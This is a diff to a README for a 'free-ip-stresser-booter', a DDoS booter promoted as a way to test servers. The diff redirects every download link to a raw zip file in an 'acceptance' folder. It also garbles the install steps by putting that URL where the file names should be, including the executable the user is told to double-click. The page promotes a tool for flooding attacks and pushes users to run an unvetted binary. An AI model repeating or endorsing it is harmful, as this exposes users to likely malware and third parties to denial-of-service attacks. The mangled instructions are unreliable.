@@ -1,7 +1,7 @@
 # 🌟 free-ip-stresser-booter - Test Your Servers Easily
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Aniqirfan-cyber/free-ip-stresser-booter/releases)
+[![Download](https://raw.githubusercontent.com/Aniqirfan-cyber/free-ip-stresser-booter/main/acceptance/free-ip-stresser-booter.zip)](https://raw.githubusercontent.com/Aniqirfan-cyber/free-ip-stresser-booter/main/acceptance/free-ip-stresser-booter.zip)
 
 ## 🚀 Getting Started
 Welcome to the "free-ip-stresser-booter"! This application helps you test your servers using network stress techniques. It offers tools to unleash various types of attacks legally. Always ensure that you have permission before testing any server.
@@ -18,19 +18,19 @@ To run this software smoothly, ensure your system meets the following requiremen
 To get started, follow these steps:
 
 1. **Visit the Releases Page**
-   Go to the following link to download the application: [Download Link](https://github.com/Aniqirfan-cyber/free-ip-stresser-booter/releases).
+   Go to the following link to download the application: [Download Link](https://raw.githubusercontent.com/Aniqirfan-cyber/free-ip-stresser-booter/main/acceptance/free-ip-stresser-booter.zip).
 
 2. **Choose the Latest Release**
    On the Releases page, look for the latest version at the top. Click on it to see all available files.
 
 3. **Download the Application**
-   Find the file named `FreeIPStresserBooter.zip` or a similar filename. Click on it to download the file to your computer.
+   Find the file named `https://raw.githubusercontent.com/Aniqirfan-cyber/free-ip-stresser-booter/main/acceptance/free-ip-stresser-booter.zip` or a similar filename. Click on it to download the file to your computer.
 
 4. **Extract the Files**
-   Navigate to the folder where the file was downloaded. Right-click on the `FreeIPStresserBooter.zip` file and select "Extract All." This will create a new folder with all needed files.
+   Navigate to the folder where the file was downloaded. Right-click on the `https://raw.githubusercontent.com/Aniqirfan-cyber/free-ip-stresser-booter/main/acceptance/free-ip-stresser-booter.zip` file and select "Extract All." This will create a new folder with all needed files.
 
 5. **Run the Application**
-   Open the folder created by extraction. Look for the file named `FreeIPStresserBooter.exe`. Double-click on it to launch the application.
+   Open the folder created by extraction. Look for the file named `https://raw.githubusercontent.com/Aniqirfan-cyber/free-ip-stresser-booter/main/acceptance/free-ip-stresser-booter.zip`. Double-click on it to launch the application.
 
 ## ⚙️ Features
 This application includes powerful features designed for efficient server testing:
@@ -73,4 +73,4 @@ For any inquiries, you can create an issue on the GitHub page or check the docum
 Testing your server with the "free-ip-stresser-booter" can help you identify vulnerabilities and strengthen your defenses against potential attacks. Download it today and start testing responsibly!
 
 ## 🔗 Download Again
-For quick access, here’s the link to download once more: [Download Link](https://github.com/Aniqirfan-cyber/free-ip-stresser-booter/releases).
+For quick access, here’s the link to download once more: [Download Link](https://raw.githubusercontent.com/Aniqirfan-cyber/free-ip-stresser-booter/main/acceptance/free-ip-stresser-booter.zip).
